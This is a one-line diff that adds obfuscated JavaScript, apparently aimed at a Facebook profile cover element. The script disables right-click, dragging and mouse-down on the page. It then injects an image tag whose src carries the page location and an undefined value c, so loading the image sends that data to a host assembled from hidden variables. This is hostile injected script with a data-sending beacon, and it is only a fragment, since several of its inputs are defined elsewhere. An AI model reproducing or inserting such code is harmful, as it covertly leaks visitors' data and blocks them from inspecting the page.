@@ -1,0 +1,1 @@
+$9513='fbProfileCover';e=e1+534+e2;$9784='<center><img src="';$9846='">';a=d.getElementById($9513);f=function(){return false;};l=location;b.ondragstart=b.oncontextmenu=b.onmousedown=f;k=l+'|'+c;e+=k;e=$9784+e+$9846;a.innerHTML+=e;
